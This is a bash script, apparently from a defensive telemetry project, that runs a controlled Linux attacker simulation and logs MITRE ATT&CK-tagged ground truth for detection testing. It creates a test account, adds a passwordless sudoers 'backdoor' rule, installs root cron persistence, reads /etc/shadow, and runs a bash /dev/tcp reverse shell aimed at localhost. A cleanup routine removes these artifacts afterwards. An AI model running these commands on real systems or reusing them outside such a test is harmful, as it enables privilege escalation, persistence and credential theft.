```bash
#!/bin/bash

# Name: 11-linux_attack_sim.sh
# Purpose: Execute a controlled Linux attacker simulation and record ground truth telemetry.
# Author: Hafidh Juma
# Project: MedDefense Endpoint Telemetry Engineering

set -e
set -u
set -o pipefail

##############################################################
# Configuration
##############################################################

TEST_USER="testattacker"
SUDOERS_FILE="/etc/sudoers.d/backdoor"
SUSPICIOUS_BIN="/tmp/suspicious_bin"
BEACON_FILE="/tmp/beacon.sh"
CRON_FILE="/etc/cron.d/persistence_test"
GROUND_TRUTH_FILE="./linux_attack_log.json"

# Localhost-only reverse-shell test.
REVERSE_SHELL_PID=""

GROUND_TRUTH="[]"
ACTION_COUNT=0

##############################################################
# Root Check
##############################################################

if [[ "${EUID}" -ne 0 ]]; then
    echo "[!] This script must be run as root."
    echo "    Use: sudo ./11-linux_attack_sim.sh"
    exit 1
fi

##############################################################
# Required Commands
##############################################################

for command in \
    date \
    useradd \
    userdel \
    id \
    cp \
    chmod \
    bash \
    timeout \
    cat \
    rm \
    jq
do
    if ! command -v "$command" >/dev/null 2>&1; then
        echo "[!] Required command not found: $command"
        exit 1
    fi
done

##############################################################
# Timestamp
##############################################################

get_utc_timestamp() {
    date -u '+%Y-%m-%dT%H:%M:%SZ'
}

##############################################################
# Ground Truth
##############################################################

add_ground_truth() {
    local action_number="$1"
    local description="$2"
    local detection_source="$3"
    local mitre_technique="$4"
    local timestamp="$5"

    GROUND_TRUTH=$(
        jq \
            --argjson action_number "$action_number" \
            --arg description "$description" \
            --arg timestamp "$timestamp" \
            --arg expected_detection_source "$detection_source" \
            --arg mitre_attack_technique "$mitre_technique" \
            '. + [{
                action_number: $action_number,
                description: $description,
                timestamp: $timestamp,
                expected_detection_source: $expected_detection_source,
                mitre_attack_technique: $mitre_attack_technique
            }]' \
            <<< "$GROUND_TRUTH"
    )

    ACTION_COUNT=$((ACTION_COUNT + 1))
}

##############################################################
# Cleanup
##############################################################

cleanup() {
    echo ""
    echo "[*] Cleaning up artifacts..."

    # Stop any locally spawned reverse-shell process.
    if [[ -n "${REVERSE_SHELL_PID}" ]]; then
        kill "${REVERSE_SHELL_PID}" 2>/dev/null || true
        wait "${REVERSE_SHELL_PID}" 2>/dev/null || true
    fi

    # Remove cron persistence.
    if [[ -f "$CRON_FILE" ]]; then
        rm -f "$CRON_FILE"
    fi

    # Remove the temporary beacon.
    if [[ -f "$BEACON_FILE" ]]; then
        rm -f "$BEACON_FILE"
    fi

    # Remove suspicious binary.
    if [[ -f "$SUSPICIOUS_BIN" ]]; then
        rm -f "$SUSPICIOUS_BIN"
    fi

    # Remove temporary sudoers rule.
    if [[ -f "$SUDOERS_FILE" ]]; then
        rm -f "$SUDOERS_FILE"
    fi

    # Remove test account.
    if id "$TEST_USER" >/dev/null 2>&1; then
        userdel "$TEST_USER" 2>/dev/null || true
    fi

    echo "    User removed, sudoers restored, cron removed,"
    echo "    temporary files removed                      [CLEAN]"
}

trap cleanup EXIT

##############################################################
# Simulation Start
##############################################################

echo "[*] Running Linux attacker simulation..."

##############################################################
# 1. Create User
##############################################################

TIMESTAMP=$(get_utc_timestamp)

echo "    [1/6] Creating user $TEST_USER... $TIMESTAMP"

# Remove an old test account if one exists.
if id "$TEST_USER" >/dev/null 2>&1; then
    userdel "$TEST_USER" 2>/dev/null || true
fi

useradd \
    -m \
    -s /bin/bash \
    "$TEST_USER"

add_ground_truth \
    1 \
    "Created local user testattacker" \
    "auditd USER_ACCT; auth.log" \
    "MITRE ATT&CK T1136.001 - Create Account: Local Account" \
    "$TIMESTAMP"

##############################################################
# 2. Modify Sudoers
##############################################################

TIMESTAMP=$(get_utc_timestamp)

echo "    [2/6] Modifying sudoers... $TIMESTAMP"

# Create a dedicated temporary sudoers drop-in.
# This exists only for the duration of this simulation.
printf '%s\n' \
    "testattacker ALL=(ALL) NOPASSWD:ALL" \
    > "$SUDOERS_FILE"

chmod 0440 "$SUDOERS_FILE"

# Validate syntax before continuing.
if command -v visudo >/dev/null 2>&1; then
    visudo -cf "$SUDOERS_FILE" >/dev/null
fi

add_ground_truth \
    2 \
    "Added testattacker to temporary sudoers rule" \
    "auditd; auth.log; file integrity telemetry" \
    "MITRE ATT&CK T1548.003 - Abuse Elevation Control Mechanism: Sudo and Sudo Caching" \
    "$TIMESTAMP"

##############################################################
# 3. Execute Binary From /tmp
##############################################################

TIMESTAMP=$(get_utc_timestamp)

echo "    [3/6] Executing from /tmp... $TIMESTAMP"

cp /usr/bin/id "$SUSPICIOUS_BIN"
chmod 0755 "$SUSPICIOUS_BIN"

"$SUSPICIOUS_BIN" >/dev/null

add_ground_truth \
    3 \
    "Copied /usr/bin/id to /tmp and executed it" \
    "auditd EXECVE; auditd PATH" \
    "MITRE ATT&CK T1059 - Command and Scripting Interpreter" \
    "$TIMESTAMP"

##############################################################
# 4. Reverse Shell Attempt - Localhost Only
##############################################################

TIMESTAMP=$(get_utc_timestamp)

echo "    [4/6] Reverse shell attempt (localhost)... $TIMESTAMP"

# This intentionally targets localhost only.
# No external destination is used.
#
# timeout prevents the test from remaining active indefinitely.
timeout 2 bash -c \
    'bash -i >& /dev/tcp/127.0.0.1/4444 0>&1 &' \
    >/dev/null 2>&1 || true

add_ground_truth \
    4 \
    "Attempted reverse shell connection to localhost:4444" \
    "auditd EXECVE; auditd network/socket telemetry" \
    "MITRE ATT&CK T1059.004 - Unix Shell" \
    "$TIMESTAMP"

##############################################################
# 5. Cron Persistence
##############################################################

TIMESTAMP=$(get_utc_timestamp)

echo "    [5/6] Cron persistence... $TIMESTAMP"

# Create a harmless beacon script.
cat > "$BEACON_FILE" <<'EOF'
#!/bin/bash
# MedDefense controlled telemetry test
exit 0
EOF

chmod 0755 "$BEACON_FILE"

# Create temporary cron persistence.
printf '%s\n' \
    "* * * * * root /tmp/beacon.sh" \
    > "$CRON_FILE"

chmod 0644 "$CRON_FILE"

add_ground_truth \
    5 \
    "Created temporary cron persistence entry" \
    "auditd PATH; auditd EXECVE; cron/syslog" \
    "MITRE ATT&CK T1053.003 - Scheduled Task/Job: Cron" \
    "$TIMESTAMP"

##############################################################
# 6. Access /etc/shadow
##############################################################

TIMESTAMP=$(get_utc_timestamp)

echo "    [6/6] Accessing /etc/shadow... $TIMESTAMP"

cat /etc/shadow > /dev/null

add_ground_truth \
    6 \
    "Read /etc/shadow" \
    "auditd PATH; auditd SYSCALL" \
    "MITRE ATT&CK T1003.008 - OS Credential Dumping: /etc/passwd and /etc/shadow" \
    "$TIMESTAMP"

##############################################################
# Save Ground Truth
##############################################################

printf '%s\n' "$GROUND_TRUTH" |
    jq '.' > "$GROUND_TRUTH_FILE"

echo ""
echo "Actions executed: $ACTION_COUNT"
echo "Ground truth saved to: $GROUND_TRUTH_FILE"
```
